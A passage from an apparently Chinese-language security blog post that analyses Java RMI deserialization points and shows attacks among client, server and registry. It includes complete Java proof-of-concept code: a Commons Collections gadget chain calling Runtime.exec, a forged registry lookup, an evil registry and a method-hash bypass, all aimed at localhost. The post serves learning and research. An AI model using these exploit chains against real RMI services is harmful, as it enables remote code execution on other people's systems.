class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var9</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var9.writeObject(var8);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var88) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var88);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var85) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var85);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var86) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var86);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.rebind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var84) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var84);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var81) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var81);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var82) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var82);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.unbind(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var80) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var80);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Operation[] getOperations() &#123;</span><br><span class="line">        <span class="keyword">return</span> (Operation[])operations.clone();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先简单分析，可以看到下面有个 switch 选择，其中分了很多 case，不同的 case 对应的是不同的方法调用。但多个 case 里面都涉及到了 readObject 的调用，所以就很明显存在反序列化了。如果此次传的是恶意对象就有可能威胁到注册中心。</p>
<h4 id="2-4、远程方法调用-客户端"><a href="#2-4、远程方法调用-客户端" class="headerlink" title="2.4、远程方法调用(客户端)"></a>2.4、远程方法调用(客户端)</h4><p>分析完了在注册中心查找远程对象的部分，接下来分析最后一行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(remoteObj.sayHello(<span class="string">&quot;hello,world&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>之前分析已经知道remoteObj是一个动态代理了，那么调用它的方法时自然是走到了调用处理器类里面，跟进RemoteObjectInvocationHandler#invoke</p>
<p><img src="/images/image-20230821164912065.png" alt="image-20230821164912065"></p>
<p>进入invokeRemoteMethod方法然后进入UnicastRef里面另一个重载的invoke一样调用了executeCall</p>
<p><img src="/images/image-20230821165051039.png" alt="image-20230821165051039"></p>
<p><img src="/images/image-20230821165115119.png" alt="image-20230821165115119"></p>
<p>值得注意的是在rtype！&#x3D;void的时候会调用unmarshalValue</p>
<p><img src="/images/image-20230821165256310.png" alt="image-20230821165256310"></p>
<p>当返回值类型不是这几种基础类型时就会调用反序列化，也就是服务端可以通过返回恶意对象来攻击客户端。</p>
<p><img src="/images/image-20230821165317176.png" alt="image-20230821165317176"></p>
<h4 id="2-5、远程方法调用（服务端）"><a href="#2-5、远程方法调用（服务端）" class="headerlink" title="2.5、远程方法调用（服务端）"></a>2.5、远程方法调用（服务端）</h4><p>和在注册中心查找远程对象时候的前半段一样，来到UnicastServerRef#dispatch</p>
<p>由于skel等于null所以进入下面的流程。<img src="/images/image-20230821173247212.png" alt="image-20230821173247212"></p>
<p>我看下面的代码会发现一个眼熟的方法<img src="/images/image-20230821173531035.png" alt="image-20230821173531035"></p>
<p><img src="/images/image-20230821173829067.png" alt="image-20230821173829067"></p>
<p>那么客户端可以通过在参数值传payload来攻击服务端。</p>
<p>总结一下可能会出现的反序列化点</p>
<p>1、攻击客户端：<br>RegistryImpl_Stub#lookup-&gt;注册中心攻击客户端<br>DGCImpl_Stub#dirty-&gt;服务端攻击客户端<br>UnicastRef#invoke-&gt;服务端攻击客户端<br>StreamRemoteCall#executeCall-&gt;服务端&#x2F;注册中心攻击客户端<br>2、攻击服务端<br>UnicastServerRef#dispatch-&gt;客户端攻击服务端<br>DGCImpl_Skel#dispatch-&gt;客户端攻击服务端<br>3、攻击注册中心<br>RegistryImpl_Skel#dispatch-&gt;客户端&#x2F;服务端攻击注册中心</p>
<h3 id="3、攻击实现"><a href="#3、攻击实现" class="headerlink" title="3、攻击实现"></a>3、攻击实现</h3><h4 id="3-1、客户端-服务端攻击注册中心"><a href="#3-1、客户端-服务端攻击注册中心" class="headerlink" title="3.1、客户端&#x2F;服务端攻击注册中心"></a>3.1、客户端&#x2F;服务端攻击注册中心</h4><p>因为注册中心和服务端在高版本 JDK 下，只能在同一台机子，所以这里就不讨论注册中心和服务端之间的互相威胁了，只讨论客户端是怎么威胁注册中心和服务端的。前面我们提到过注册中心反序列化点在RegistryImpl_Skel#dispatch.</p>
<p><img src="/images/image-20230821202725867.png" alt="image-20230821202725867"></p>
<p>实际上这里面有反序列化点的都能打。客户端传进来的 String 类型 user 就是它的参数，如果此次传的是恶意对象就有可能威胁到注册中心。这里我们关注lookup。正常使用应该是客户端调用RegistryImpl_Stub里面的lookup。</p>
<p><img src="/images/image-20230821201141212.png" alt="image-20230821201141212"></p>
<p>调用invoke将要发送的数据发送出去。客户端获取RegistryImpl_Stub了，也就获取到了里面的ref，自己实现一个lookup把恶意对象发过去就行了，不走写好的流程。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.example.IRemoteObj;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.registry.RegistryImpl_Stub;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiClient</span> &#123;</span><br><span class="line">    <span class="comment">//客户端攻击服务端/低版本使用</span></span><br><span class="line"><span class="comment">//    public static void main(String[] args) throws Exception &#123;</span></span><br><span class="line"><span class="comment">//        Object o=CC1.getCC1();</span></span><br><span class="line"><span class="comment">//        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span></span><br><span class="line"><span class="comment">////        IRemoteObj remoteObj =(IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</span></span><br><span class="line"><span class="comment">//        IRemoteObj remoteObj =IRemoteObj.class.cast(Proxy.newProxyInstance(</span></span><br><span class="line"><span class="comment">//                IRemoteObj.class.getClassLoader(),</span></span><br><span class="line"><span class="comment">//                new Class[]&#123;IRemoteObj.class&#125;,</span></span><br><span class="line"><span class="comment">//                (InvocationHandler)o));</span></span><br><span class="line"><span class="comment">//        registry.bind(&quot;sss&quot;,remoteObj);</span></span><br><span class="line"><span class="comment">//        System.out.printf(remoteObj.sayHello(&quot;hello&quot;));</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    public static void main(String[] args) throws Exception&#123;</span></span><br><span class="line"><span class="comment">//        String url = &quot;rmi://127.0.0.1:1099/remoteObj&quot;;</span></span><br><span class="line"><span class="comment">//        InitialContext initialContext = new InitialContext();</span></span><br><span class="line"><span class="comment">//        IRemoteObj remoteObj= (IRemoteObj) initialContext.lookup(url);</span></span><br><span class="line"><span class="comment">//        System.out.printf(remoteObj.sayHello(&quot;hello&quot;));</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 获取注册表</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 查找对应的服务</span></span><br><span class="line">        lookup((RegistryImpl_Stub) registry);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</span></span><br><span class="line"><span class="comment">//        // 调用方法</span></span><br><span class="line"><span class="comment">//        System.out.println(remoteObj.sayHello(&quot;hello,world&quot;));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">(RegistryImpl_Stub registry)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">RemoteObjectClass</span> <span class="operator">=</span> registry.getClass().getSuperclass().getSuperclass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">refField</span> <span class="operator">=</span> RemoteObjectClass.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) refField.get(registry);</span><br><span class="line">        Operation[] operations = <span class="keyword">new</span> <span class="title class_">Operation</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.lang.String list()[]&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall(registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(genEvilMap());</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">genEvilMap</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line">        <span class="keyword">return</span> map2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-2、注册中心攻击客户端"><a href="#3-2、注册中心攻击客户端" class="headerlink" title="3.2、注册中心攻击客户端"></a>3.2、注册中心攻击客户端</h4><p>这里我们看RegstyImpl_Stub#lookup,客户端会调用这个方法，我们之前提到过这里存在反序列化点。</p>
<p><img src="/images/image-20230821205001368.png" alt="image-20230821205001368"></p>
<p>也就是说，如果我们给注册中心绑定上一个恶意类，就能触发。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.example.RmiClient.genEvilMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilRegistry</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteWrapper</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RemoteWrapper</span> <span class="keyword">implements</span> <span class="title class_">Remote</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> Map map;</span><br><span class="line"></span><br><span class="line">    RemoteWrapper() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = genEvilMap();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230821205542350.png" alt="image-20230821205542350"></p>
<h4 id="3-3、客户端攻击服务端"><a href="#3-3、客户端攻击服务端" class="headerlink" title="3.3、客户端攻击服务端"></a>3.3、客户端攻击服务端</h4><p>之前我们提到过，客户端调用服务端远程对象的过程中，服务端的UnicastServerRef#dispatch会调用unmarshalValue<a href="#2.5%E3%80%81%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%88%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%89">在这里</a>，这里可以发现可以因为都是调用unmarshalValue所以可以进行互相攻击。这里就只简单写一下客户端攻击服务端。根据unmarshalValue可知服务端接收的参数类型不能是基础类型。如果接收参数是Object，那就很简单，直接传恶意对象就行了。</p>
<p><img src="/images/image-20230821212222287.png" alt="image-20230821212222287"></p>
<p><img src="/images/image-20230821212207863.png" alt="image-20230821212207863"></p>
<p>但是当服务端没有Object参数之类的的呢。我们强制传入object会怎么样呢。答案是报错。</p>
<p><img src="/images/image-20230821213347667.png" alt="image-20230821213347667"></p>
<p>根据报错信息我们看一下能不能实现，</p>
<p><img src="/images/image-20230821213734221.png" alt="image-20230821213734221"></p>
<p>如果我们可以使hash在hashToMethod_Map里面，就能通过这个判断，之后就可以执行unmarshalValue，从而实现触发。而有个很关键的点就是 String 它不是基础类型。换句话说，如果服务段上这个 method 方法它的入参类型是 String，我们强行给它传个 Object，它也是能够反序列化成功的（前提是绕过 MethodHash 检查）。</p>
<p><code>这里不太明白，后续补上</code></p>
<p>找到计算hash的地方在RemoteObjectInvocationHandler#invoke看到了调用invokeRemoteMethod，看到了ref.invoke传递的getMethodHash(method)<img src="/../images/image-20230822175541444.png" alt="image-20230822175541444"></p>
<p><img src="/../images/image-20230822180725060.png" alt="image-20230822180725060"></p>
<p>可以看到这里我们传入的还是Object和服务端不一致。这里我们改一下值，将其改成String类型。</p>
<p><code>ClassLoader.getSystemClassLoader().loadClass(&quot;org.example.IRemoteObj&quot;).getDeclaredMethod(&quot;sayHello&quot;,String.class)</code></p>
<p><img src="/../images/image-20230822180824956.png" alt="image-20230822180824956"></p>
<p>然后跳过发现成功反序列化了。</p>
<p>贴一个白日梦组长师傅的代码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.example.RmiClient.genEvilMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiClientGoServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        invoke(remoteObj);</span><br><span class="line"><span class="comment">//        remoteObj.sayCalc(genEvilMap());</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(IRemoteObj remoteObj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hField</span> <span class="operator">=</span> remoteObj.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;h&quot;</span>);</span><br><span class="line">        hField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">remoteObjectInvocationHandler</span> <span class="operator">=</span> hField.get(remoteObj);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">refField</span> <span class="operator">=</span> remoteObjectInvocationHandler.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) refField.get(remoteObjectInvocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> IRemoteObj.class.getDeclaredMethod(<span class="string">&quot;sayHello&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">methodToHash_mapsMethod</span> <span class="operator">=</span> remoteObjectInvocationHandler.getClass().getDeclaredMethod(<span class="string">&quot;getMethodHash&quot;</span>,Method.class);</span><br><span class="line">        methodToHash_mapsMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> (<span class="type">long</span>) methodToHash_mapsMethod.invoke(remoteObj, method);</span><br><span class="line"></span><br><span class="line">        ref.invoke(remoteObj, method, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;genEvilMap()&#125;, hash);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码就是自己写invoke逻辑，直接将数据发送过去</p>
<p><img src="/../images/image-20230822181352230.png" alt="image-20230822181352230"></p>
<p>和前面的逻辑是一样的，invoke发送过去后服务端就会接收，不用对后面进行处理。逻辑是这么个逻辑，但是我写不出来。组长牛逼</p>
